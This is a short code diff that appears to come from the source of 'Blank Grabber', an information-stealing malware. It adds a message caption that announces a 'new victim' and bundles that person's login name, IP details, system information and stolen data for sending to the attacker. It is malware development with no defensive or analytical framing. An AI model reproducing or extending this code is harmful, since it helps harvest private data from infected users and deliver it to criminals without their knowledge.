@@ -1659,6 +1659,7 @@ class BlankGrabber:
 
             payload = {
                 "content": "||@everyone||" if Settings.PingMe else "",
+                'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                 "embeds": [
                     {
                         "title": "Blank Grabber",
